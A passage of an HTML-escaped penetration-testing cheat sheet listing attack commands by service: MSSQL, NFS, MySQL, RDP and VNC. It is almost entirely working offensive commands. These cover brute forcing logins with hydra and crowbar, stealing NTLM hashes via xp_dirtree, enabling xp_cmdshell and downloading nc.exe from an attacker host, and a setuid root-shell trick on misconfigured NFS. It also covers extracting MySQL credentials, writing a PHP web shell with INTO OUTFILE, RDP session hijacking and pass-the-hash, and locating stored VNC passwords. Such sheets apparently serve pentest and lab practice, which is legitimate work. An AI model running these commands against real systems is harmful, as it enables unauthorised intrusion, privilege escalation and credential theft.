punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E mssql -vV -I -u\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"having-credentials\"\u003EHaving credentials\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Emssqlclient.py -windows-auth \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EDOMAIN\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u002F\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EUSER\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E:\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPASSWORD\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E@\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\nmssqlclient.py \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EUSER\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E:\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPASSWORD\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E@\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\n\n# Once logged in you can run queries:\nSQL\u003E select @@ version;\n\n# Steal NTLM hash\nsudo smbserver.py -smb2support liodeus .\nSQL\u003E exec master..xp_dirtree '\\\\\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\\liodeus\\' # Steal the NTLM hash, crack it with john or hashcat\n\n# Try to enable code execution\nSQL\u003E enable_xp_cmdshell\n\n# Execute code\nSQL\u003E xp_cmdshell whoami \u002Fall\nSQL\u003E xp_cmdshell certutil.exe -urlcache -split -f http:\u002F\u002F\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u002Fnc.exe\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"manual-exploit\"\u003EManual exploit\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003ECheatsheet :\n    - https:\u002F\u002Fwww.asafety.fr\u002Fmssql-injection-cheat-sheet\u002F\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Chr\u003E\n\u003Ch2 id=\"nfs---2049\"\u003ENFS - 2049\u003C\u002Fh2\u003E\n\u003Ch3 id=\"show-mountable-nfs-shares\"\u003EShow Mountable NFS Shares\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Eshowmount -e \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\nnmap --script=nfs-showmount -oN mountable_shares \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"mount-a-share\"\u003EMount a share\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Esudo mount -v -t nfs \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E:\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003ESHARE\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EDIRECTORY\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\nsudo mount -v -t nfs -o vers=2 \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E:\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003ESHARE\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EDIRECTORY\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"nfs-misconfigurations\"\u003ENFS misconfigurations\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003E# List exported shares\ncat \u002Fetc\u002Fexports\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003EIf you find some directory that is configured as no_root_squash\u002Fno_all_squash you may be able to privesc.\u003C\u002Fp\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003E# Attacker, as root user\n\nmkdir \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EDIRECTORY\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\nmount -v -t nfs \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E:\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003ESHARE\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EDIRECTORY\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\ncd \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EDIRECTORY\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\necho 'int main(void){setreuid(0,0); system(\"\u002Fbin\u002Fbash\"); return 0;}' \u003E pwn.c\ngcc pwn.c -o pwn\nchmod +s pwn\n\n# Victim\n\ncd \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003ESHARE\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\n.\u002Fpwn # Root shell\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Chr\u003E\n\u003Ch2 id=\"mysql---3306\"\u003EMYSQL - 3306\u003C\u002Fh2\u003E\n\u003Ch3 id=\"brute-force-6\"\u003EBrute force\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Ehydra -L \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EUSERS_LIST\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -P \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPASSWORDS_LIST\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E mysql -vV -I -u\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"extracting-mysql-credentials-from-files\"\u003EExtracting MySQL credentials from files\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Ecat \u002Fetc\u002Fmysql\u002Fdebian.cnf\ngrep -oaE \"[-_\\.\\*a-Z0-9]{3,}\" \u002Fvar\u002Flib\u002Fmysql\u002Fmysql\u002Fuser.MYD | grep -v \"mysql_native_password\"\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"connect\"\u003EConnect\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003E# Local\nmysql -u \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EUSER\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\nmysql -u \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EUSER\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -p\n\n# Remote\nmysql -h \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -u \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EUSER\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"mysql-commands\"\u003EMySQL commands\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Eshow databases;\nuse \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EDATABASES\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E;\n\nshow tables;\ndescribe \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003ETABLE\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E;\n\nselect * from \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003ETABLE\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E;\n\n# Try to execute code\nselect do_system('id');\n\\! sh\n\n# Read &amp; Write\nselect load_file('\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EFILE\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E');\nselect 1,2,\"\u003Cspan class=\"token prolog\"\u003E&lt;?php echo shell_exec($_GET['c']);?\u003E\u003C\u002Fspan\u003E\",4 into OUTFILE '\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EOUT_FILE\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E'\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"manual-exploit-1\"\u003EManual exploit\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003ECheatsheet :\n    - https:\u002F\u002Fwww.asafety.fr\u002Fmysql-injection-cheat-sheet\u002F\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Chr\u003E\n\u003Ch2 id=\"rdp---3389\"\u003ERDP - 3389\u003C\u002Fh2\u003E\n\u003Ch3 id=\"brute-force-7\"\u003EBrute force\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Ecrowbar -b rdp -s \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u002FCIDR -u \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EUSER\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -C \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPASSWORDS_LIST\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\ncrowbar -b rdp -s \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u002FCIDR -U \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EUSERS_LIST\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -C \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPASSWORDS_LIST\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\n\nhydra -f -L \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EUSERS_LIST\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -P \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPASSWORDS_LIST\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E rdp:\u002F\u002F\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -u -vV\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"connect-with-known-credentials--hash\"\u003EConnect with known credentials \u002F hash\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Erdesktop -u \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EUSERNAME\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\nrdesktop -d \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EDOMAIN\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -u \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EUSERNAME\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -p \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPASSWORD\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\n\nxfreerdp \u002Fu:[DOMAIN\\]\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EUSERNAME\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \u002Fp:\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPASSWORD\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \u002Fv:\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\nxfreerdp \u002Fu:[DOMAIN\\]\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EUSERNAME\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \u002Fpth:\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EHASH\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \u002Fv:\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"session-stealing\"\u003ESession stealing\u003C\u002Fh3\u003E\n\u003Ch4 id=\"get-openned-sessions\"\u003EGet openned sessions\u003C\u002Fh4\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Equery user\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch4 id=\"access-to-the-selected\"\u003EAccess to the selected\u003C\u002Fh4\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Etscon \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EID\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \u002Fdest:\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003ESESSIONNAME\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"adding-user-to-rdp-group-windows\"\u003EAdding user to RDP group (Windows)\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Enet localgroup \"Remote Desktop Users\" \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EUSER\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \u002Fadd\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Chr\u003E\n\u003Ch2 id=\"vnc---5800---58001---5900---5901\"\u003EVNC - 5800 - 58001 - 5900 - 5901\u003C\u002Fh2\u003E\n\u003Ch3 id=\"scans-1\"\u003EScans\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Enmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -v -p \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPORT\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"brute-force-8\"\u003EBrute force\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Ehydra -L \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EUSERS_LIST\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E P \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPASSWORDS_LIST\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -s \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPORT\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E vnc -u -vV\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"connect-1\"\u003EConnect\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Evncviewer \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E:\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPORT\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"found-vnc-password\"\u003EFound VNC password\u003C\u002Fh3\u003E\n\u003Ch4 id=\"linux\"\u003ELinux\u003C\u002Fh4\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003EDefault password is stored in: ~\u002F.vnc\u002Fpasswd\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch4 id=\"windows\"\u003EWindows\u003C\u002Fh4\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003E# RealVNC\nHKEY_LOCAL_MACHINE\\SOFTWARE\\RealVNC\\vncserver\n\n# TightVNC\nHKEY_CURRENT_USER\\Software\\TightVNC\\Server\n\n# TigerVNC\nHKEY_LOCAL_USER\\Software\\TigerVNC\\WinVNC4\n\n# UltraVNC\nC:\\Program Files\\UltraVNC\\ultravnc.ini\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"decrypt-vnc-password\"\u003EDecrypt VNC password\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode 